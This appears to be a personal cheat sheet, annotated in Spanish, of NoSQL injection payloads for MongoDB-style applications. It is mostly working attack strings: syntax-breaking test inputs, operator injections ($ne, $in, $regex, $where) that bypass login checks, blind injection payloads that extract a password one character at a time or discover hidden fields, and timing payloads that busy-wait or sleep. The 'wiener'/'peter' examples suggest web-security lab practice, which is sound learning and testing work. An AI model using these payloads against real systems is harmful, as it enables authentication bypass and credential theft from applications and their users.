# Syntax injection

Test: 
```
'"`{
;$Foo}
$Foo \xYZ
```
One-line: ```'"`{\n;$Foo}\n$Foo \xYZ```


Common payloads:
```
'||'1'=='1
'\u0000 -> Ignora todo lo que sigue
```

# Operator injection
- $where: Cumple una condición 
- $ne: not equal -> ```{"username":{"$ne":"invalid"}}``` OR  ```username[$ne]=invalid```
- $in: Dentro del array -> ```{"username":{"$in":["admin","administrator","superadmin"]}}```
- $regex: regex match -> ```{"username":{"$regex":"^a."}}```

# Blind NoSQLi
```
' && this.password[0] == 'a' || 'a'=='b
' && this.password.match(/\d/) || 'a'=='b -> ¿Tiene números?
' && this.password.match(/[A-Z]/) || 'a'=='b -> ¿Tiene mayúsculas?
' && this.password.match(/[^a-zA-Z0-9]/) || 'a'=='b -> ¿Tiene símbolos?
' && this.password.length == 8 || 'a'=='b -> ¿Cuál es la longitud?
{"username":"wiener","password":"peter", "$where":"0"} -> Validad respuesta cuando es false
{"username":"wiener","password":"peter", "$where":"1"} -> Validad respuesta cuando es true
{"username":"wiener","password":"peter", "$where":"Object.keys(this)[0].match('^.{0}a.*')"} -> encontrar nuevos parametros
```

# Timing based injection
```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
